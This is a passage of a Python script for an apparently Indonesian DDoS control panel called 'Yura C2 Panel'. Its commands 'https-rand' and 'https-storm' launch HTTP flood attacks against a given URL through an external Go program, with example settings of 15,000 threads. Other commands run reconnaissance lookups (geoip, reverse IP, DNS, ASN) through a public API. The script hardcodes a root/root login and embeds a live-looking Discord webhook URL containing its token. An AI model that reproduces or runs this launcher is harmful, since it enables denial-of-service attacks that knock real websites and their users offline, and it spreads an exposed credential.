            except IndexError:
                print('Usage: https-rand <url> <threads> METHODS<GET/POST> <time>')
                print('Example: https-rand http://example.com 15000 get 60')

        elif "https-storm" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run HTTPS-STORM.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: https-storm <url> <threads> METHODS<GET/POST> <time>')
                print('Example: https-storm http://example.com 15000 get 60')                           
     
# TOOLS
        elif "geoip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/geoip/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: geoip <ip>')
                print('Example: geoip 1.1.1.1')

        elif "reverseip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverseip <ip>')
                print('Example: reverseip 1.1.1.1')

        elif "subnet-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: subnet-lookup <cdr/ip + netmask>')
                print('Example: subnet-lookup 192.168.1.0/24')
              
        elif "asn-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/aslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: asn-lookup <ip/asn>')
                print('Example: asn-lookup AS15169')
                          
        elif "dns-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: dns-lookup <dns>')
                print('Example: dns-lookup google.com')

        elif "reverse-dns" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reversedns/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverse-dns <ip/domain>')
                print('Example: reverse-dns 8.8.8.8')                

        elif "cloudflare-lag" in cnc:
            print('Method "CLOUDFLARE-LAG" not enabled')

        elif "help" in cnc:
            print(f'''
LAYER7  ► MENAMPILKAN METHODE LAYER7
LAYER4  ► MENAMPILKAN METHODE LAYER4
PORTS   ► MENAMPILKAN SEMUA PORT
TOOLS   ► MENAMPILKAN TOOLS
            ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass
                
webhook_url = "https://discord.com/api/webhooks/1120049356687560726/HCEGcv4uqlTu4X5ATB7sVLihAUVXxfWdC9yYikP3MFaYJ4yfjpwhKno-F9DrT-SoPrTQ"
 
def login(): 
     clear() 
     user = "root" 
     passwd = "root" 
     print("🔥Welcome To Yura C2 Panel🔥")
     print("Silahkan Isi Password Di Bawah ini🙏")
     username = input("⚡ Username: ") 
     password = getpass.getpass(prompt='⚡ Password: ') 
     if username != user or password != passwd: 
         print("") 
         print("⚡ Password yang anda masukan tidak sah ! sila pm @fengzzt untuk mendapatkan akses") 
         sys.exit(1) 
     elif username == user and password == passwd: 
         print("⚡ Sedang Mengantar ke Dashboard Yura C2 Panel") 
         main() 
     
login()
